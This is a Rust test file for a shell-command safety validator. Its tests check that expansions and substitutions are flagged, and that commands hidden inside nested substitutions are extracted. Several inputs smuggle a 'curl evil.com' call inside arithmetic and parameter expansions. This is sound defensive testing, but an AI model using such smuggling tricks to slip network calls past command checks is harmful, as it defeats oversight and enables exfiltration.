use super::*;

#[test]
fn test_validate_terminal_command_rejects_parameter_expansion() {
    assert_eq!(
        validate_terminal_command("echo $HOME"),
        TerminalCommandValidation::Unsafe
    );
}

#[test]
fn test_validate_terminal_command_rejects_braced_parameter_expansion() {
    assert_eq!(
        validate_terminal_command("echo ${HOME}"),
        TerminalCommandValidation::Unsafe
    );
}

#[test]
fn test_validate_terminal_command_rejects_special_parameters() {
    assert_eq!(
        validate_terminal_command("echo $?"),
        TerminalCommandValidation::Unsafe
    );
    assert_eq!(
        validate_terminal_command("echo $$"),
        TerminalCommandValidation::Unsafe
    );
    assert_eq!(
        validate_terminal_command("echo $@"),
        TerminalCommandValidation::Unsafe
    );
}

#[test]
fn test_validate_terminal_command_rejects_command_substitution() {
    assert_eq!(
        validate_terminal_command("echo $(whoami)"),
        TerminalCommandValidation::Unsafe
    );
}

#[test]
fn test_validate_terminal_command_rejects_backticks() {
    assert_eq!(
        validate_terminal_command("echo `whoami`"),
        TerminalCommandValidation::Unsafe
    );
}

#[test]
fn test_validate_terminal_command_rejects_arithmetic_expansion() {
    assert_eq!(
        validate_terminal_command("echo $((1 + 1))"),
        TerminalCommandValidation::Unsafe
    );
}

#[test]
fn test_validate_terminal_command_rejects_process_substitution() {
    assert_eq!(
        validate_terminal_command("cat <(ls)"),
        TerminalCommandValidation::Unsafe
    );
    assert_eq!(
        validate_terminal_command("ls >(cat)"),
        TerminalCommandValidation::Unsafe
    );
}

#[test]
fn test_validate_terminal_command_rejects_forbidden_constructs_in_env_var_assignments() {
    assert_eq!(
        validate_terminal_command("PAGER=$HOME git log"),
        TerminalCommandValidation::Unsafe
    );
    assert_eq!(
        validate_terminal_command("PAGER=$(whoami) git log"),
        TerminalCommandValidation::Unsafe
    );
}

#[test]
fn test_validate_terminal_command_returns_unsupported_for_parse_failure() {
    assert_eq!(
        validate_terminal_command("echo $(ls &&)"),
        TerminalCommandValidation::Unsupported
    );
}

#[test]
fn test_validate_terminal_command_rejects_substitution_in_case_pattern() {
    assert_ne!(
        validate_terminal_command("case x in $(echo y)) echo z;; esac"),
        TerminalCommandValidation::Safe
    );
}

#[test]
fn test_validate_terminal_command_safe_case_clause_without_substitutions() {
    assert_eq!(
        validate_terminal_command("case x in foo) echo hello;; esac"),
        TerminalCommandValidation::Safe
    );
}

#[test]
fn test_validate_terminal_command_rejects_substitution_in_arithmetic_for_clause() {
    assert_ne!(
        validate_terminal_command("for ((i=$(echo 0); i<3; i++)); do echo hello; done"),
        TerminalCommandValidation::Safe
    );
}

#[test]
fn test_validate_terminal_command_rejects_arithmetic_for_clause_unconditionally() {
    assert_eq!(
        validate_terminal_command("for ((i=0; i<3; i++)); do echo hello; done"),
        TerminalCommandValidation::Unsafe
    );
}

#[test]
fn test_arithmetic_expansion_nested_command_substitution() {
    let commands = extract_commands("echo $(($(curl evil.com)))").expect("parse failed");
    assert!(commands.iter().any(|c| c.contains("echo")));
    assert!(commands.iter().any(|c| c.contains("curl")));
}

#[test]
fn test_arithmetic_expansion_nested_backtick_substitution() {
    let commands = extract_commands("echo $((`whoami`))").expect("parse failed");
    assert!(commands.iter().any(|c| c.contains("echo")));
    assert!(commands.contains(&"whoami".to_string()));
}

#[test]
fn test_arithmetic_expansion_without_substitution() {
    let commands = extract_commands("echo $((1+2))").expect("parse failed");
    assert_eq!(commands, vec!["echo $((1+2))"]);
}

#[test]
fn test_arithmetic_expansion_doubly_nested_command_substitution() {
    let commands = extract_commands("echo $(($(($(curl evil.com)))))").expect("parse failed");
    assert!(commands.iter().any(|c| c.contains("echo")));
    assert!(commands.iter().any(|c| c.contains("curl")));
}

#[test]
fn test_arithmetic_expansion_inside_double_quotes() {
    let commands = extract_commands("echo \"$(($(curl evil.com)))\"").expect("parse failed");
    assert!(commands.iter().any(|c| c.contains("echo")));
    assert!(commands.iter().any(|c| c.contains("curl")));
}

#[test]
fn test_parameter_expansion_default_value_extracts_command_substitution() {
    let commands = extract_commands("echo ${V:-$(curl evil.com)}").expect("parse failed");
    assert!(commands.iter().any(|c| c.contains("echo")));
    assert!(commands.iter().any(|c| c.contains("curl")));
}

#[test]
fn test_parameter_expansion_assign_default_extracts_command_substitution() {
    let commands = extract_commands("echo ${V:=$(curl evil.com)}").expect("parse failed");
    assert!(commands.iter().any(|c| c.contains("echo")));
    assert!(commands.iter().any(|c| c.contains("curl")));
}

#[test]
fn test_parameter_expansion_alternative_value_extracts_command_substitution() {
    let commands = extract_commands("echo ${V:+$(curl evil.com)}").expect("parse failed");
    assert!(commands.iter().any(|c| c.contains("echo")));
    assert!(commands.iter().any(|c| c.contains("curl")));
}

#[test]
fn test_parameter_expansion_error_message_extracts_command_substitution() {
    let commands = extract_commands("echo ${V:?$(curl evil.com)}").expect("parse failed");
    assert!(commands.iter().any(|c| c.contains("echo")));
    assert!(commands.iter().any(|c| c.contains("curl")));
}

#[test]
fn test_parameter_expansion_replacement_extracts_command_substitution() {
    let commands = extract_commands("echo ${V/x/$(curl evil.com)}").expect("parse failed");
    assert!(commands.iter().any(|c| c.contains("echo")));
    assert!(commands.iter().any(|c| c.contains("curl")));
}

#[test]
fn test_parameter_expansion_suffix_pattern_extracts_command_substitution() {
    let commands = extract_commands("echo ${V%$(curl evil.com)}").expect("parse failed");
    assert!(commands.iter().any(|c| c.contains("echo")));
    assert!(commands.iter().any(|c| c.contains("curl")));
}

#[test]
fn test_parameter_expansion_substring_offset_extracts_command_substitution() {
    let commands = extract_commands("echo ${V:$(($(curl evil.com))):1}").expect("parse failed");
    assert!(commands.iter().any(|c| c.contains("echo")));
    assert!(commands.iter().any(|c| c.contains("curl")));
}
